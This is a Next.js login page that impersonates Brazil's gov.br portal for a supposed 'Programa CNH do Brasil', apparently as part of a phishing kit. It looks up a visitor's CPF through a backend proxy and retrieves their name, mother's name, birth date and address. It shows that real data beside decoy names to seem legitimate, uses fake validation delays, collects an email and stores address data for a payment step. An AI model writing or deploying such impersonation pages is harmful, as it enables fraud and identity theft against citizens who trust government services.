'use client';

import { useState, FormEvent } from 'react';
import { useRouter } from 'next/navigation';
import Image from 'next/image';
import Link from 'next/link';
import { useAuth } from '@/contexts/AuthContext';
import { FaIdCard, FaUniversity, FaQrcode, FaAddressCard, FaCloud, FaQuestionCircle } from 'react-icons/fa';

interface UserData {
  cpf: string;
  nome: string;
  mae: string;
  sexo: string;
  nascimento: string;
}

// Lista de nomes brasileiros para gerar opções falsas
const NOMES_FALSOS = [
  'MARIA SILVA SANTOS', 'JOSE OLIVEIRA COSTA', 'ANA PAULA FERREIRA',
  'CARLOS EDUARDO LIMA', 'JULIANA ALVES RODRIGUES', 'MARCOS ANTONIO SOUZA',
  'PATRICIA RIBEIRO ALMEIDA', 'FERNANDO GOMES PEREIRA', 'CAMILA MARTINS BARBOSA',
  'RODRIGO CARVALHO NASCIMENTO', 'LUCIANA MENDES ARAUJO', 'RAFAEL TEIXEIRA DIAS',
  'ADRIANA LOPES CARDOSO', 'BRUNO HENRIQUE MOREIRA', 'VANESSA SANTOS CORREIA',
  'LEONARDO PINTO VIEIRA', 'DANIELA CASTRO ROCHA', 'GUSTAVO RAMOS MONTEIRO',
  'TATIANA FREITAS MACHADO', 'DIEGO AZEVEDO CUNHA', 'RENATA DUARTE CAMPOS',
  'THIAGO NUNES CAVALCANTI', 'AMANDA REIS MEDEIROS', 'FELIPE MIRANDA ANDRADE',
  'FERNANDA BATISTA MOURA', 'RICARDO SALES NOGUEIRA', 'PRISCILA FARIAS BEZERRA',
  'ANDERSON VIEIRA MELO', 'SIMONE BARROS AGUIAR', 'MARCELO CRUZ PINHEIRO'
];

// Lista de nomes de mães para gerar opções falsas
const NOMES_MAES_FALSOS = [
  'MARIA DAS GRAÇAS SILVA', 'ANA LUCIA SANTOS', 'FRANCISCA OLIVEIRA COSTA',
  'ANTONIA FERREIRA LIMA', 'SANDRA REGINA ALVES', 'ROSA MARIA RODRIGUES',
  'JOSEFA SOUZA PEREIRA', 'LUCIA HELENA MARTINS', 'TEREZINHA BARBOSA GOMES',
  'MARGARIDA NASCIMENTO ARAUJO', 'VERA LUCIA DIAS CARDOSO', 'ELIZABETH MOREIRA LOPES',
  'HELENA CORREIA VIEIRA', 'REGINA ROCHA MONTEIRO', 'APARECIDA MACHADO CUNHA',
  'TEREZA CAMPOS CAVALCANTI', 'INES MEDEIROS ANDRADE', 'MARLENE MOURA NOGUEIRA',
  'NEIDE BEZERRA MELO', 'SONIA AGUIAR PINHEIRO', 'CLEUSA RIBEIRO FREITAS',
  'IVONE CARVALHO MENDES', 'ELZA TEIXEIRA NUNES', 'DALVA REIS BATISTA',
  'ZILDA FARIAS SALES', 'IRENE BARROS DUARTE', 'ODETE MIRANDA CRUZ'
];

export default function LoginPage() {
  const router = useRouter();
  const { login } = useAuth();
  const [step, setStep] = useState<'cpf' | 'nome' | 'nascimento' | 'mae' | 'email'>('cpf');
  const [cpf, setCpf] = useState('');
  const [userData, setUserData] = useState<UserData | null>(null);
  const [isLoading, setIsLoading] = useState(false);
  const [errorMessage, setErrorMessage] = useState('');
  const [opcoesNome, setOpcoesNome] = useState<string[]>([]);
  const [nomeSelecionado, setNomeSelecionado] = useState<string | null>(null);
  const [opcoesNascimento, setOpcoesNascimento] = useState<string[]>([]);
  const [nascimentoSelecionado, setNascimentoSelecionado] = useState<string | null>(null);
  const [opcoesMae, setOpcoesMae] = useState<string[]>([]);
  const [maeSelecionada, setMaeSelecionada] = useState<string | null>(null);
  const [emailInput, setEmailInput] = useState('');

  // Gerar opções de nome (1 correta + 2 falsas)
  const gerarOpcoesNome = (nomeCorreto: string): string[] => {
    const nomeUpper = nomeCorreto.toUpperCase();
    const nomesFiltrados = NOMES_FALSOS.filter(n => n !== nomeUpper);
    const shuffled = nomesFiltrados.sort(() => Math.random() - 0.5);
    const falsos = shuffled.slice(0, 2);
    const opcoes = [nomeUpper, ...falsos].sort(() => Math.random() - 0.5);
    return opcoes;
  };

  // Formatar data de YYYY-MM-DD para DD/MM/YYYY
  const formatarData = (data: string): string => {
    if (!data) return '';
    if (data.includes('/')) return data;
    const [ano, mes, dia] = data.split('-');
    return `${dia}/${mes}/${ano}`;
  };

  // Gerar data aleatória próxima (para opções falsas)
  const gerarDataAleatoria = (dataBase: string): string => {
    const [ano, mes, dia] = dataBase.split('-').map(Number);
    const date = new Date(ano, mes - 1, dia);
    
    // Gerar variação aleatória (entre -5 e +5 anos, meses e dias diferentes)
    const variacaoAno = Math.floor(Math.random() * 10) - 5;
    const variacaoMes = Math.floor(Math.random() * 12);
    const variacaoDia = Math.floor(Math.random() * 28) + 1;
    
    const novaData = new Date(ano + variacaoAno, variacaoMes, variacaoDia);
    const diaStr = String(novaData.getDate()).padStart(2, '0');
    const mesStr = String(novaData.getMonth() + 1).padStart(2, '0');
    const anoStr = String(novaData.getFullYear());
    
    return `${diaStr}/${mesStr}/${anoStr}`;
  };

  // Gerar opções de data de nascimento (1 correta + 2 falsas)
  const gerarOpcoesNascimento = (dataCorreta: string): string[] => {
    const dataFormatada = formatarData(dataCorreta);
    
    // Gerar 2 datas falsas diferentes
    let dataFalsa1 = gerarDataAleatoria(dataCorreta);
    let dataFalsa2 = gerarDataAleatoria(dataCorreta);
    
    // Garantir que as datas falsas sejam diferentes entre si e da correta
    while (dataFalsa1 === dataFormatada) {
      dataFalsa1 = gerarDataAleatoria(dataCorreta);
    }
    while (dataFalsa2 === dataFormatada || dataFalsa2 === dataFalsa1) {
      dataFalsa2 = gerarDataAleatoria(dataCorreta);
    }
    
    const opcoes = [dataFormatada, dataFalsa1, dataFalsa2].sort(() => Math.random() - 0.5);
    return opcoes;
  };

  // Gerar opções de nome da mãe (1 correta + 2 falsas)
  const gerarOpcoesMae = (nomeCorreto: string): string[] => {
    const nomeUpper = nomeCorreto.toUpperCase();
    const nomesFiltrados = NOMES_MAES_FALSOS.filter(n => n !== nomeUpper);
    const shuffled = nomesFiltrados.sort(() => Math.random() - 0.5);
    const falsos = shuffled.slice(0, 2);
    const opcoes = [nomeUpper, ...falsos].sort(() => Math.random() - 0.5);
    return opcoes;
  };

  // Limpar CPF (remover pontos e traços)
  const limparCPF = (cpfValue: string): string => {
    return cpfValue.replace(/\D/g, '');
  };

  // Formatar CPF com máscara
  const formatarCPF = (valor: string): string => {
    const numeros = valor.replace(/\D/g, '');
    
    if (numeros.length > 11) {
      return formatarCPF(numeros.substring(0, 11));
    }
    
    if (numeros.length > 9) {
      return numeros.replace(/(\d{3})(\d{3})(\d{3})(\d{2})/, '$1.$2.$3-$4');
    } else if (numeros.length > 6) {
      return numeros.replace(/(\d{3})(\d{3})(\d{3})/, '$1.$2.$3');
    } else if (numeros.length > 3) {
      return numeros.replace(/(\d{3})(\d{3})/, '$1.$2');
    }
    
    return numeros;
  };

  // Handler de mudança no input
  const handleCpfChange = (e: React.ChangeEvent<HTMLInputElement>) => {
    const valorFormatado = formatarCPF(e.target.value);
    setCpf(valorFormatado);
    // Limpar erro ao digitar
    if (errorMessage) {
      setErrorMessage('');
    }
  };

  // Buscar dados do usuário via proxy (com User-Agent Python)
  const buscarDadosUsuario = async (cpfValue: string) => {
    const cpfLimpo = limparCPF(cpfValue);
    const url = `/api/cpf/${cpfLimpo}`;
    
    try {
      const response = await fetch(url);
      if (!response.ok) {
        throw new Error('Erro ao buscar dados do usuário');
      }
      const dados = await response.json();
      return dados;
    } catch (error) {
      console.error('Erro:', error);
      throw error;
    }
  };

  // Handler do submit - Etapa CPF
  const handleCpfSubmit = async (e: FormEvent) => {
    e.preventDefault();
    
    const cpfLimpo = limparCPF(cpf);
    
    if (cpfLimpo.length !== 11) {
      setErrorMessage('Por favor, digite um CPF válido');
      return;
    }

    setIsLoading(true);
    setErrorMessage('');

    try {
      const dadosUsuario = await buscarDadosUsuario(cpf);
      
      // Salvar dados básicos do usuário
      const dadosBasicos: UserData = {
        cpf: cpfLimpo,
        nome: dadosUsuario.nome || '',
        mae: dadosUsuario.nomeMae || '',
        sexo: dadosUsuario.sexo || '',
        nascimento: dadosUsuario.dataNascimento || ''
      };
      
      setUserData(dadosBasicos);
      
      // Salvar no localStorage com dados de endereço para autoescola e pagamento
      localStorage.setItem('userBasicData', JSON.stringify({
        ...dadosBasicos,
        cidade: dadosUsuario.cidade || '',
        uf: dadosUsuario.uf || '',
        endereco: dadosUsuario.endereco || '',
        bairro: dadosUsuario.bairro || '',
        cep: dadosUsuario.cep || '',
        telefone: dadosUsuario.telefone || '',
        email: dadosUsuario.email || '',
        // Endereço estruturado para gateway de pagamento
        enderecoCompleto: dadosUsuario.enderecoCompleto || null
      }));
      localStorage.setItem('cpfUsuario', cpfLimpo);
      
      console.log('Dados do usuário salvos:', dadosBasicos);
      
      // Gerar opções de nome e ir para etapa de validação
      const opcoes = gerarOpcoesNome(dadosBasicos.nome);
      setOpcoesNome(opcoes);
      setNomeSelecionado(null);
      setStep('nome');
      setIsLoading(false);
      
    } catch (error) {
      setErrorMessage('CPF inválido. Tente novamente.');
      setIsLoading(false);
    }
  };

  // Handler do submit - Etapa Nome
  const handleNomeSubmit = async (e: FormEvent) => {
    e.preventDefault();
    
    if (!nomeSelecionado) {
      setErrorMessage('Por favor, selecione seu nome');
      return;
    }

    if (!userData) {
      setErrorMessage('Erro: dados do usuário não encontrados');
      return;
    }

    // Verificar se o nome selecionado é o correto
    if (nomeSelecionado.toUpperCase() !== userData.nome.toUpperCase()) {
      setErrorMessage('Nome incorreto. Tente novamente.');
      return;
    }

    setErrorMessage('');
    setIsLoading(true);

    try {
      // Simular validação
      await new Promise(resolve => setTimeout(resolve, 800));
      
      // Gerar opções de data de nascimento e ir para próximo step
      const opcoes = gerarOpcoesNascimento(userData.nascimento);
      setOpcoesNascimento(opcoes);
      setNascimentoSelecionado(null);
      setStep('nascimento');
      setIsLoading(false);
      
    } catch (error) {
      alert('Erro ao processar.');
      setIsLoading(false);
    }
  };

  // Handler do submit - Etapa Nascimento
  const handleNascimentoSubmit = async (e: FormEvent) => {
    e.preventDefault();
    
    if (!nascimentoSelecionado) {
      setErrorMessage('Por favor, selecione sua data de nascimento');
      return;
    }

    if (!userData) {
      setErrorMessage('Erro: dados do usuário não encontrados');
      return;
    }

    // Verificar se a data selecionada é a correta
    const dataCorreta = formatarData(userData.nascimento);
    if (nascimentoSelecionado !== dataCorreta) {
      setErrorMessage('Data de nascimento incorreta. Tente novamente.');
      return;
    }

    setErrorMessage('');
    setIsLoading(true);

    try {
      // Simular validação
      await new Promise(resolve => setTimeout(resolve, 800));
      
      // Gerar opções de nome da mãe e ir para próximo step
      const opcoes = gerarOpcoesMae(userData.mae);
      setOpcoesMae(opcoes);
      setMaeSelecionada(null);
      setStep('mae');
      setIsLoading(false);
      
    } catch (error) {
      alert('Erro ao processar.');
      setIsLoading(false);
    }
  };

  // Handler do submit - Etapa Nome da Mãe
  const handleMaeSubmit = async (e: FormEvent) => {
    e.preventDefault();
    
    if (!maeSelecionada) {
      setErrorMessage('Por favor, selecione o nome da sua mãe');
      return;
    }

    if (!userData) {
      setErrorMessage('Erro: dados do usuário não encontrados');
      return;
    }

    // Verificar se o nome selecionado é o correto
    if (maeSelecionada.toUpperCase() !== userData.mae.toUpperCase()) {
      setErrorMessage('Nome da mãe incorreto. Tente novamente.');
      return;
    }

    setErrorMessage('');
    setIsLoading(true);

    try {
      // Simular validação
      await new Promise(resolve => setTimeout(resolve, 800));
      
      // Ir para step de email
      setStep('email');
      setIsLoading(false);
      
    } catch (error) {
      alert('Erro ao processar.');
      setIsLoading(false);
    }
  };

  // Handler do submit - Etapa Email
  const handleEmailSubmit = async (e: FormEvent) => {
    e.preventDefault();
    
    if (!emailInput || !emailInput.includes('@')) {
      setErrorMessage('Por favor, digite um email válido');
      return;
    }

    if (!userData) {
      setErrorMessage('Erro: dados do usuário não encontrados');
      return;
    }

    setErrorMessage('');
    setIsLoading(true);

    try {
      // Simular validação
      await new Promise(resolve => setTimeout(resolve, 1000));
      
      // Preparar dados para login
      const loginData = {
        nome: userData.nome,
        cpf: userData.cpf,
        dataNascimento: userData.nascimento,
        email: emailInput,
        telefone: '',
      };
      
      // Fazer login usando o contexto
      login(loginData);
      
      // Salvar dados completos
      localStorage.setItem('usuarioLogado', JSON.stringify({
        ...loginData,
        mae: userData.mae,
        sexo: userData.sexo,
      }));

      // Atualizar userBasicData com o email
      const userBasicData = JSON.parse(localStorage.getItem('userBasicData') || '{}');
      localStorage.setItem('userBasicData', JSON.stringify({
        ...userBasicData,
        email: emailInput
      }));
      
      // Buscar configuração do tenant para determinar o fluxo
      try {
        const tenantResponse = await fetch('/api/tenant');
        const tenantData = await tenantResponse.json();
        const fluxo = tenantData?.config?.fluxo || 'a';
        
        // Salvar fluxo no localStorage para uso posterior
        localStorage.setItem('fluxoAtual', fluxo);
        
        // Redirecionar baseado no fluxo
        if (fluxo === 'b') {
          router.push('/saiba-mais');
        } else {
          router.push('/questionario');
        }
      } catch {
        // Fallback para fluxo A
        router.push('/questionario');
      }
      
    } catch (error) {
      alert('Erro ao realizar login.');
      setIsLoading(false);
    }
  };

  return (
    <div className="min-h-screen bg-[#f8f8f8] flex flex-col">
      {/* Header gov.br */}
      <header className="bg-white px-4 py-3 flex items-center justify-between shadow-sm">
        <Link href="/">
          <Image src="/logo645.png" alt="gov.br" width={100} height={32} className="h-8 w-auto" />
        </Link>
        <div className="flex items-center space-x-3">
          {/* Ícone contraste */}
          <button className="text-[#1351B4] hover:opacity-80">
            <svg className="w-6 h-6" viewBox="0 0 24 24" fill="currentColor">
              <circle cx="12" cy="12" r="10" fill="none" stroke="currentColor" strokeWidth="2"/>
              <path d="M12 2a10 10 0 0 1 0 20V2z" fill="currentColor"/>
            </svg>
          </button>
          {/* Ícone acessibilidade */}
          <button className="text-[#1351B4] hover:opacity-80">
            <svg className="w-6 h-6" viewBox="0 0 24 24" fill="currentColor">
              <path d="M12 2C13.1 2 14 2.9 14 4C14 5.1 13.1 6 12 6C10.9 6 10 5.1 10 4C10 2.9 10.9 2 12 2ZM21 9H15V22H13V16H11V22H9V9H3V7H21V9Z"/>
            </svg>
          </button>
        </div>
      </header>

      <main className="flex-1 flex justify-center px-4 py-8">
        <div className="w-full max-w-md">
          <div className="bg-white rounded-lg shadow-md p-6">
            {step === 'cpf' ? (
              <>
                <h1 className="text-[#333] text-lg font-semibold mb-6">Identifique-se no gov.br com:</h1>
                
                <form className="space-y-4" onSubmit={handleCpfSubmit}>
                  <div>
                    <div className="flex items-center text-blue font-medium mb-3">
                      <FaIdCard className="mr-3 text-blue" />
                      Número do CPF
                    </div>
                    
                    <p className="text-[#555] text-sm mb-4">
                      Digite seu CPF para <span className="font-semibold">criar</span> ou <span className="font-semibold">acessar</span> sua conta gov.br
                    </p>
                    
                    <div>
                      <label htmlFor="cpf" className="text-[#333] text-sm font-medium block mb-2">
                        CPF
                      </label>
                      <input
                        id="cpf"
                        type="text"
                        placeholder=""
                        className={`w-full border rounded px-3 py-3 text-base transition-colors focus:outline-none focus:ring-2 ${
                          errorMessage 
                            ? 'border-red-500 focus:border-red-500 focus:ring-red-500' 
                            : 'border-gray-300 focus:border-[#1351B4] focus:ring-[#1351B4]'
                        }`}
                        maxLength={14}
                        value={cpf}
                        onChange={handleCpfChange}
                        style={{ fontSize: '16px' }}
                      />
                      {errorMessage && step === 'cpf' && (
                        <p className="mt-2 text-sm text-red-600">
                          {errorMessage}
                        </p>
                      )}
                    </div>
                  </div>
                  
                  <button
                    type="submit"
                    disabled={isLoading}
                    className="bg-[#1351B4] hover:bg-[#0D3A8C] mt-4 flex h-[48px] w-full items-center justify-center rounded-full text-base font-medium text-white transition-colors disabled:opacity-50"
                  >
                    {isLoading ? (
                      <div className="h-5 w-5 animate-spin rounded-full border-2 border-white border-t-transparent"></div>
                    ) : (
                      'Continuar'
                    )}
                  </button>
                </form>

                {/* Outras opções de identificação */}
                <div className="mt-8 pt-6 border-t border-gray-200">
                  <h2 className="text-[#333] font-semibold mb-4">Outras opções de identificação:</h2>
                  <ul className="space-y-4">
                    <li className="flex items-center text-blue">
                      <span className="w-2 h-2 bg-blue rounded-full mr-3"></span>
                      <FaUniversity className="mr-3 text-blue" />
                      Login com o seu banco
                    </li>
                    <li className="flex items-center text-[#333]">
                      <span className="w-2 h-2 bg-blue rounded-full mr-3"></span>
                      <FaQrcode className="mr-3 text-blue" />
                      Login com QR code
                    </li>
                    <li className="flex items-center text-[#333]">
                      <span className="w-2 h-2 bg-blue rounded-full mr-3"></span>
                      <FaAddressCard className="mr-3 text-blue" />
                      Seu certificado digital
                    </li>
                    <li className="flex items-center text-[#333]">
                      <span className="w-2 h-2 bg-blue rounded-full mr-3"></span>
                      <FaCloud className="mr-3 text-blue" />
                      Seu certificado digital em nuvem
                    </li>
                  </ul>
                </div>
              </>
            ) : step === 'nome' ? (
              <>
                <h1 className="text-gray-dark mb-6 text-xl font-bold">Confirme sua identidade</h1>
                
                <form className="space-y-4" onSubmit={handleNomeSubmit}>
                  <div>
                    <label htmlFor="cpf-display" className="text-gray-dark mb-1 block text-xs font-medium">
                      CPF
                    </label>
                    <input
                      id="cpf-display"
                      type="text"
                      value={cpf}
                      disabled
                      className="text-gray-dark w-full rounded border px-3 py-2 text-base font-medium bg-gray-100 border-gray-300"
                      style={{ fontSize: '16px' }}
                    />
                  </div>

                  <div>
                    <label className="text-gray-dark mb-3 block text-xs font-medium">
                      Selecione seu nome completo:
                    </label>
                    <div className="space-y-2">
                      {opcoesNome.map((nome: string, index: number) => (
                        <button
                          key={index}
                          type="button"
                          onClick={() => {
                            setNomeSelecionado(nome);
                            if (errorMessage) setErrorMessage('');
                          }}
                          className={`w-full rounded border px-4 py-3 text-left text-sm font-medium transition-colors ${
                            nomeSelecionado === nome
                              ? 'border-blue bg-blue/5 text-blue'
                              : 'border-gray-300 text-gray-dark hover:border-gray-400 hover:bg-gray-50'
                          }`}
                        >
                          {nome}
                        </button>
                      ))}
                    </div>
                    {errorMessage && step === 'nome' && (
                      <p className="mt-2 text-sm text-red-600">
                        {errorMessage}
                      </p>
                    )}
                  </div>

                  <div className="flex gap-3">
                    <button
                      type="button"
                      onClick={() => {
                        setStep('cpf');
                        setNomeSelecionado(null);
                        setErrorMessage('');
                      }}
                      className="flex h-[44px] flex-1 items-center justify-center rounded-full border-2 border-blue px-4 py-2.5 text-sm font-medium text-blue transition-colors hover:bg-blue-50"
                    >
                      Voltar
                    </button>
                    <button
                      type="submit"
                      disabled={isLoading || !nomeSelecionado}
                      className="bg-blue flex h-[44px] flex-1 items-center justify-center rounded-full px-4 py-2.5 text-sm font-medium text-white shadow transition-opacity hover:opacity-90 disabled:opacity-50"
                    >
                      {isLoading ? (
                        <div className="h-5 w-5 animate-spin rounded-full border-2 border-white border-t-transparent"></div>
                      ) : (
                        'Confirmar'
                      )}
                    </button>
                  </div>
                </form>
              </>
            ) : step === 'nascimento' ? (
              <>
                <h1 className="text-gray-dark mb-2 text-base font-bold">Confirme seus dados para o cadastro no Programa CNH do Brasil</h1>
                <p className="text-gray-dark mb-6 text-sm font-medium">Qual é sua data de nascimento?</p>
                
                <form className="space-y-4" onSubmit={handleNascimentoSubmit}>
                  <div>
                    <div className="space-y-2">
                      {opcoesNascimento.map((data: string, index: number) => (
                        <button
                          key={index}
                          type="button"
                          onClick={() => {
                            setNascimentoSelecionado(data);
                            if (errorMessage) setErrorMessage('');
                          }}
                          className={`w-full rounded border px-4 py-3 text-left text-sm font-medium transition-colors ${
                            nascimentoSelecionado === data
                              ? 'border-blue bg-blue/5 text-blue'
                              : 'border-gray-300 text-gray-dark hover:border-gray-400 hover:bg-gray-50'
                          }`}
                        >
                          {data}
                        </button>
                      ))}
                    </div>
                    {errorMessage && step === 'nascimento' && (
                      <p className="mt-2 text-sm text-red-600">
                        {errorMessage}
                      </p>
                    )}
                  </div>

                  <div className="flex gap-3">
                    <button
                      type="button"
                      onClick={() => {
                        setStep('nome');
                        setNascimentoSelecionado(null);
                        setErrorMessage('');
                      }}
                      className="flex h-[44px] flex-1 items-center justify-center rounded-full border-2 border-blue px-4 py-2.5 text-sm font-medium text-blue transition-colors hover:bg-blue-50"
                    >
                      Voltar
                    </button>
                    <button
                      type="submit"
                      disabled={isLoading || !nascimentoSelecionado}
                      className="bg-blue flex h-[44px] flex-1 items-center justify-center rounded-full px-4 py-2.5 text-sm font-medium text-white shadow transition-opacity hover:opacity-90 disabled:opacity-50"
                    >
                      {isLoading ? (
                        <div className="h-5 w-5 animate-spin rounded-full border-2 border-white border-t-transparent"></div>
                      ) : (
                        'Confirmar'
                      )}
                    </button>
                  </div>
                </form>
              </>
            ) : step === 'mae' ? (
              <>
                <h1 className="text-gray-dark mb-2 text-base font-bold">Confirme seus dados para o cadastro no Programa CNH do Brasil</h1>
                <p className="text-gray-dark mb-6 text-sm font-medium">Qual é o nome da sua mãe?</p>
                
                <form className="space-y-4" onSubmit={handleMaeSubmit}>
                  <div>
                    <div className="space-y-2">
                      {opcoesMae.map((nome: string, index: number) => (
                        <button
                          key={index}
                          type="button"
                          onClick={() => {
                            setMaeSelecionada(nome);
                            if (errorMessage) setErrorMessage('');
                          }}
                          className={`w-full rounded border px-4 py-3 text-left text-sm font-medium transition-colors ${
                            maeSelecionada === nome
                              ? 'border-blue bg-blue/5 text-blue'
                              : 'border-gray-300 text-gray-dark hover:border-gray-400 hover:bg-gray-50'
                          }`}
                        >
                          {nome}
                        </button>
                      ))}
                    </div>
                    {errorMessage && step === 'mae' && (
                      <p className="mt-2 text-sm text-red-600">
                        {errorMessage}
                      </p>
                    )}
                  </div>

                  <div className="flex gap-3">
                    <button
                      type="button"
                      onClick={() => {
                        setStep('nascimento');
                        setMaeSelecionada(null);
                        setErrorMessage('');
                      }}
                      className="flex h-[44px] flex-1 items-center justify-center rounded-full border-2 border-blue px-4 py-2.5 text-sm font-medium text-blue transition-colors hover:bg-blue-50"
                    >
                      Voltar
                    </button>
                    <button
                      type="submit"
                      disabled={isLoading || !maeSelecionada}
                      className="bg-blue flex h-[44px] flex-1 items-center justify-center rounded-full px-4 py-2.5 text-sm font-medium text-white shadow transition-opacity hover:opacity-90 disabled:opacity-50"
                    >
                      {isLoading ? (
                        <div className="h-5 w-5 animate-spin rounded-full border-2 border-white border-t-transparent"></div>
                      ) : (
                        'Confirmar'
                      )}
                    </button>
                  </div>
                </form>
              </>
            ) : (
              <>
                <h1 className="text-gray-dark mb-2 text-base font-bold">Cadastro no Programa CNH do Brasil</h1>
                <p className="text-gray-dark mb-6 text-sm font-medium">Informe seu e-mail para contato:</p>
                
                <form className="space-y-4" onSubmit={handleEmailSubmit}>
                  <div>
                    <label htmlFor="email-input" className="text-gray-dark mb-1 block text-xs font-medium">
                      E-mail
                    </label>
                    <input
                      id="email-input"
                      type="email"
                      placeholder="seuemail@exemplo.com"
                      value={emailInput}
                      onChange={(e) => {
                        setEmailInput(e.target.value);
                        if (errorMessage) setErrorMessage('');
                      }}
                      className={`text-gray-dark w-full rounded border px-3 py-2 text-base font-medium transition-colors placeholder:text-gray-400 focus:outline-none focus:ring-1 ${
                        errorMessage && step === 'email'
                          ? 'border-red-500 focus:border-red-500 focus:ring-red-500' 
                          : 'border-gray-300 focus:border-black focus:ring-black'
                      }`}
                      style={{ fontSize: '16px' }}
                    />
                    {errorMessage && step === 'email' && (
                      <p className="mt-2 text-sm text-red-600">
                        {errorMessage}
                      </p>
                    )}
                    <p className="mt-2 text-xs text-gray-500">
                      Utilizaremos seu e-mail para enviar atualizações sobre o programa.
                    </p>
                  </div>

                  <div className="flex gap-3">
                    <button
                      type="button"
                      onClick={() => {
                        setStep('mae');
                        setErrorMessage('');
                      }}
                      className="flex h-[44px] flex-1 items-center justify-center rounded-full border-2 border-blue px-4 py-2.5 text-sm font-medium text-blue transition-colors hover:bg-blue-50"
                    >
                      Voltar
                    </button>
                    <button
                      type="submit"
                      disabled={isLoading || !emailInput}
                      className="bg-blue flex h-[44px] flex-1 items-center justify-center rounded-full px-4 py-2.5 text-sm font-medium text-white shadow transition-opacity hover:opacity-90 disabled:opacity-50"
                    >
                      {isLoading ? (
                        <div className="h-5 w-5 animate-spin rounded-full border-2 border-white border-t-transparent"></div>
                      ) : (
                        'Continuar'
                      )}
                    </button>
                  </div>
                </form>
              </>
            )}

            <div className="mt-8 pt-6 border-t border-gray-200 space-y-4">
              <div className="flex items-center text-blue text-sm cursor-default">
                <FaQuestionCircle className="mr-2 text-blue" />
                <span>{step === 'cpf' ? 'Está com dúvidas e precisa de ajuda?' : 'Ficou com dúvidas?'}</span>
              </div>
              
              <div className="text-blue text-sm cursor-default">
                <span>Termo de Uso e Aviso de Privacidade</span>
              </div>
            </div>
          </div>
        </div>
      </main>

      {/* Footer */}
      <footer className="w-full mt-auto">
        <Image 
          src="/transferir.png" 
          alt="Banner decorativo" 
          width={1920}
          height={40}
          className="w-full h-10 object-cover"
        />
      </footer>
    </div>
  );
}
